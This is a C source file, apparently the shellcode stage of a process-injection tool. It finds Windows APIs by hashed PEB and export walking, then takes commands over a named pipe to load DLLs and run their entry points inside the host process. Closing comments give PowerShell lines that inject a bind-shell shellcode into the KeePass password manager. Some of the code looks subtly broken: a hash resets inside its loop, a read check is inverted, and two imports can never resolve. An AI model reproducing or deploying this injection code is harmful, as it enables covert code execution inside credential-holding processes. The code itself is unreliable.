#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include <Windows.h>

#include "protocol.h"
#include "peb.h"
#include "hash.h"

#define STATUS_NOT_SUPPORTED             ((NTSTATUS)0xC00000BBL)

#pragma region Function call definitions

typedef NTSTATUS(WINAPI *fLdrLoadDll)(
    UINT_PTR pathToFile,
    DWORD flags,
    PUNICODE_STRING moduleFileName,
    PHANDLE moduleHandle
    );

typedef BOOLEAN(__cdecl *fRtlAddFunctionTable)(
    _In_reads_(EntryCount) PRUNTIME_FUNCTION FunctionTable,
    _In_ DWORD EntryCount,
    _In_ DWORD64 BaseAddress
    );

typedef LPVOID(WINAPI *fVirtualAlloc)(
    _In_opt_ LPVOID lpAddress,
    _In_     SIZE_T dwSize,
    _In_     DWORD flAllocationType,
    _In_     DWORD flProtect
    );

typedef BOOL(WINAPI *fVirtualFree)(
    _Pre_notnull_ _When_(dwFreeType == MEM_DECOMMIT, _Post_invalid_) _When_(dwFreeType == MEM_RELEASE, _Post_ptr_invalid_) LPVOID lpAddress,
    _In_ SIZE_T dwSize,
    _In_ DWORD dwFreeType
    );

typedef HANDLE(WINAPI *fCreateFileW)(
    _In_            LPCWSTR               lpFileName,
    _In_            DWORD                 dwDesiredAccess,
    _In_            DWORD                 dwShareMode,
    _In_opt_        LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_            DWORD                 dwCreationDisposition,
    _In_            DWORD                 dwFlagsAndAttributes,
    _In_opt_        HANDLE                hTemplateFile
    );

typedef BOOL(WINAPI *fReadFile)(
    _In_            HANDLE       hFile,
    _Out_           LPVOID       lpBuffer,
    _In_            DWORD        nNumberOfBytesToRead,
    _Out_opt_       LPDWORD      lpNumberOfBytesRead,
    _Inout_opt_     LPOVERLAPPED lpOverlapped
    );

typedef BOOL(WINAPI *fWriteFile)(
    _In_            HANDLE       hFile,
    _In_            LPCVOID      lpBuffer,
    _In_            DWORD        nNumberOfBytesToWrite,
    _Out_opt_       LPDWORD      lpNumberOfBytesWritten,
    _Inout_opt_     LPOVERLAPPED lpOverlapped
    );

// calling closehandle might crash the process because of the relocation
typedef BOOL(WINAPI *fCloseHandle)(
    _In_ HANDLE hObject
    );

typedef BOOL(WINAPI *DLL_ENTRY_POINT)(
    _In_ HMODULE    moduleHandle,
    _In_ DWORD      callReason,
    _In_ PVOID      reserved
    );

#pragma endregion

// Write the logic for the primary payload here
DWORD PayloadEntry(PPAYLOAD_PARAMETERS parameters)
{
    fLdrLoadDll pLdrLoadDll = NULL;
    fRtlAddFunctionTable pRtlAddFunctionTable = NULL;

    fVirtualAlloc pVirtualAlloc = NULL;
    fVirtualFree pVirtualFree = NULL;
    fCreateFileW pCreateFileW = NULL;
    fReadFile pReadFile = NULL;
    fWriteFile pWriteFile = NULL;
    fCloseHandle pCloseHandle = NULL;

#pragma region Resolve Imports (InLoadOrderModuleList -> ExportDirectory walk)

#pragma warning( push )
#pragma warning( disable : 4055 ) // Ignore cast warnings

    PPEB PebAddress;
    PMY_PEB_LDR_DATA pLdr;
    PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
    PVOID pModuleBase;
    PIMAGE_NT_HEADERS pNTHeader;
    DWORD dwExportDirRVA;
    PIMAGE_EXPORT_DIRECTORY pExportDir;
    PLIST_ENTRY pNextModule;
    DWORD dwNumFunctions;
    USHORT usOrdinalTableIndex;
    PDWORD pdwFunctionNameBase;
    PCSTR pFunctionName;
    UNICODE_STRING BaseDllName;
    DWORD dwModuleHash;
    DWORD dwFunctionHash;
    PCSTR pTempChar;
    DWORD i;
    FARPROC pFunction;

#if defined(_WIN64)
    PebAddress = (PPEB)__readgsqword(0x60);
#else
    PebAddress = (PPEB)__readfsdword(0x30);
#endif

    pLdr = (PMY_PEB_LDR_DATA)PebAddress->Ldr;
    pNextModule = pLdr->InLoadOrderModuleList.Flink;
    pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pNextModule;

    while (pDataTableEntry->DllBase != NULL)
    {
        dwModuleHash = 0;
        pModuleBase = pDataTableEntry->DllBase;
        BaseDllName = pDataTableEntry->BaseDllName;
        pNTHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModuleBase + ((PIMAGE_DOS_HEADER)pModuleBase)->e_lfanew);
        dwExportDirRVA = pNTHeader->OptionalHeader.DataDirectory[0].VirtualAddress;

        // Get the next loaded module entry
        pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pDataTableEntry->InLoadOrderLinks.Flink;

        // If the current module does not export any functions, move on to the next module.
        if (dwExportDirRVA == 0)
            continue;

        // Calculate the module hash
        for (i = 0; i < BaseDllName.MaximumLength; i++)
        {
            pTempChar = ((PCSTR)BaseDllName.Buffer + i);

            dwModuleHash = 5381;

            if (*pTempChar >= 0x61)
                dwModuleHash = ((dwModuleHash << 5) + dwModuleHash) + (*pTempChar - 0x20); // to lowercase
            else
                dwModuleHash = ((dwModuleHash << 5) + dwModuleHash) + *pTempChar;
        }

        if (dwModuleHash != HASH_KERNEL32DLL && dwModuleHash != HASH_NTDLL)
            continue;

        pExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)pModuleBase + dwExportDirRVA);

        dwNumFunctions = pExportDir->NumberOfNames;
        pdwFunctionNameBase = (PDWORD)((PCHAR)pModuleBase + pExportDir->AddressOfNames);

        for (i = 0; i < dwNumFunctions; i++)
        {
            pFunctionName = (PCSTR)(*pdwFunctionNameBase + (ULONG_PTR)pModuleBase);
            pdwFunctionNameBase++;

            pTempChar = pFunctionName;

            dwFunctionHash = 5381;
            do
            {
                dwFunctionHash = ((dwFunctionHash << 5) + dwFunctionHash) + *pTempChar;
                pTempChar++;
            } while (*(pTempChar - 1) != 0);

            if (dwModuleHash == HASH_NTDLL
                && (dwFunctionHash == HASH_LDRLOADDLL
                    || dwFunctionHash == HASH_RTLADDFUNCTIONTABLE))
            {
                usOrdinalTableIndex = *(PUSHORT)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfNameOrdinals) + (2 * i));
                pFunction = (HMODULE)((ULONG_PTR)pModuleBase + *(PDWORD)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfFunctions) + (4 * usOrdinalTableIndex)));

                if (dwFunctionHash == HASH_LDRLOADDLL)
                    pLdrLoadDll = pFunction;
#ifdef _WIN64
                else if (dwFunctionHash == HASH_RTLADDFUNCTIONTABLE)
                    pRtlAddFunctionTable = pFunction;
#endif
            }
            else if (dwModuleHash == HASH_KERNEL32DLL
                && (dwFunctionHash == HASH_CREATEFILEW
                    || dwFunctionHash == HASH_READFILE
                    || dwFunctionHash == HASH_WRITEFILE
                    || dwFunctionHash == HASH_CLOSEHANDLE))
            {
                usOrdinalTableIndex = *(PUSHORT)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfNameOrdinals) + (2 * i));
                pFunction = (HMODULE)((ULONG_PTR)pModuleBase + *(PDWORD)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfFunctions) + (4 * usOrdinalTableIndex)));

                if (dwFunctionHash == HASH_VIRTUALALLOC)
                    pVirtualAlloc = (fVirtualAlloc)pFunction;
                else if (dwFunctionHash == HASH_VIRTUALFREE)
                    pVirtualFree = (fVirtualFree)pFunction;
                else if (dwFunctionHash == HASH_CREATEFILEW)
                    pCreateFileW = (fCreateFileW)pFunction;
                else if (dwFunctionHash == HASH_READFILE)
                    pReadFile = (fReadFile)pFunction;
                else if (dwFunctionHash == HASH_WRITEFILE)
                    pWriteFile = (fWriteFile)pFunction;
                else if (dwFunctionHash == HASH_CLOSEHANDLE)
                    pCloseHandle = (fCloseHandle)pFunction;
            }

            if (pLdrLoadDll
#ifdef _WIN64
                && pRtlAddFunctionTable
#endif
                && pVirtualAlloc
                && pVirtualFree
                && pCreateFileW
                && pReadFile
                && pWriteFile
                && pCloseHandle)
                goto doneExports; // finish if all functions are resolved
        }
    }

    return MM_ERROR_NO_EXPORT;

doneExports:
    ;

#pragma warning( pop )

#pragma endregion

#pragma region Start the communication over named pipe

    HANDLE pipeHandle = pCreateFileW(parameters->namedPipePath, FILE_ALL_ACCESS, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (INVALID_HANDLE_VALUE == pipeHandle)
        return MM_ERROR_OPEN_PIPE;

    PMMRPC_PACKET request = pVirtualAlloc(NULL, MM_MAX_PACKET_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    BOOLEAN continueLoop = TRUE;

    do
    {
        DWORD temp;
        if (pReadFile(pipeHandle, request, MM_MAX_PACKET_SIZE, &temp, NULL))
            return MM_ERROR_READ_PIPE;

        PMMRPC_PACKET response;
        DWORD responseSize;

        switch (request->opCode)
        {
            case MMRPC_OP_QUERY_PEB:
            {
                responseSize = sizeof(MMRPC_PACKET_QUERY_PEB_RESPONSE);
                response = &(MMRPC_PACKET_QUERY_PEB_RESPONSE)
                {
                    MMRPC_OP_QUERY_PEB, PebAddress
                };
                break;
            }
            case MMRPC_OP_IS_MODULE_LOADED:
            {
                PMMRPC_PACKET_IS_MODULE_LOADED_REQUEST moduleRequest = (PMMRPC_PACKET_IS_MODULE_LOADED_REQUEST)request;

#pragma region Enumerate modules (InLoadOrderModuleList walk)

                pLdr = (PMY_PEB_LDR_DATA)PebAddress->Ldr;
                pNextModule = pLdr->InLoadOrderModuleList.Flink;
                pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pNextModule;

                BOOL found = FALSE;
                while (pDataTableEntry->DllBase != NULL)
                {
                    dwModuleHash = 0;
                    pModuleBase = pDataTableEntry->DllBase;
                    BaseDllName = pDataTableEntry->BaseDllName;

                    // Get the next loaded module entry
                    pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pDataTableEntry->InLoadOrderLinks.Flink;

                    // Calculate the module hash
                    for (i = 0; i < BaseDllName.MaximumLength; i++)
                    {
                        pTempChar = ((PCSTR)BaseDllName.Buffer + i);

                        dwModuleHash = 5381;

                        if (*pTempChar >= 0x61)
                            dwModuleHash = ((dwModuleHash << 5) + dwModuleHash) + (*pTempChar - 0x20); // to lowercase
                        else
                            dwModuleHash = ((dwModuleHash << 5) + dwModuleHash) + *pTempChar;
                    }

                    if (dwModuleHash == moduleRequest->moduleNameHash)
                    {
                        found = TRUE;
                        break;
                    }
                }

#pragma endregion

                responseSize = sizeof(MMRPC_PACKET_DWORD_RESPONSE);
                response = &(MMRPC_PACKET_DWORD_RESPONSE)
                {
                    MMRPC_OP_IS_MODULE_LOADED, found
                };

                break;
            }
            case MMRPC_OP_LOAD_DLL:
            {
                PMMRPC_PACKET_LOAD_DLL_REQUEST moduleRequest = (PMMRPC_PACKET_LOAD_DLL_REQUEST)request;

                HANDLE handle;
                NTSTATUS status = pLdrLoadDll(NULL, 0, moduleRequest->addressToDllNameUnicodeString, &handle);

                responseSize = sizeof(MMRPC_PACKET_NTSTATUS_RESPONSE);
                response = &(MMRPC_PACKET_NTSTATUS_RESPONSE)
                {
                    MMRPC_OP_LOAD_DLL, status
                };

                break;
            }
            case MMRPC_OP_CALL_ENTRY:
            {
                PMMRPC_PACKET_CALL_ENTRY_REQUEST moduleRequest = (PMMRPC_PACKET_CALL_ENTRY_REQUEST)request;
                DWORD result = ((DLL_ENTRY_POINT)moduleRequest->entryAddress)((HMODULE)moduleRequest->baseAddress, moduleRequest->callReason, NULL);

                responseSize = sizeof(MMRPC_PACKET_DWORD_RESPONSE);
                response = &(MMRPC_PACKET_DWORD_RESPONSE)
                {
                    MMRPC_OP_CALL_ENTRY, result
                };

                break;
            }
            case MMRPC_OP_ADD_FUNCTION_TABLE:
            {
                PMMRPC_PACKET_ADD_FUNCTION_TABLE_REQUEST moduleRequest = (PMMRPC_PACKET_ADD_FUNCTION_TABLE_REQUEST)request;

                NTSTATUS status = STATUS_NOT_SUPPORTED;

#ifdef _WIN64
                status = pRtlAddFunctionTable(moduleRequest->functionTableAddress, moduleRequest->functionTableLength, moduleRequest->baseAddress);
#endif

                responseSize = sizeof(MMRPC_PACKET_NTSTATUS_RESPONSE);
                response = &(MMRPC_PACKET_NTSTATUS_RESPONSE)
                {
                    MMRPC_OP_ADD_FUNCTION_TABLE, status
                };

                break;
            }
            default:
                response = &(MMRPC_PACKET)
                {
                    MMRPC_OP_UNKNOWN
                };
                responseSize = sizeof(MMRPC_PACKET);
        }

        if (!pWriteFile(pipeHandle, response, responseSize, &temp, NULL))
            return MM_ERROR_WRITE_PIPE;
    } while (continueLoop);

#pragma endregion

    pVirtualFree(request, MM_MAX_PACKET_SIZE, MEM_RELEASE);

    return 0x0;
}

// $sc = gc -Encoding Byte .\PIC_Bindshell_shellcode.bin;$str='';$sc | %{$str += "0x" + ('{0:X2}' -f $_)+', '};$str | clip
// $sc = gc -Encoding Byte .\PIC_Bindshell_shellcode.bin; Invoke - Shellcode - ProcessID((ps keepass).Id) - Shellcode $sc - Force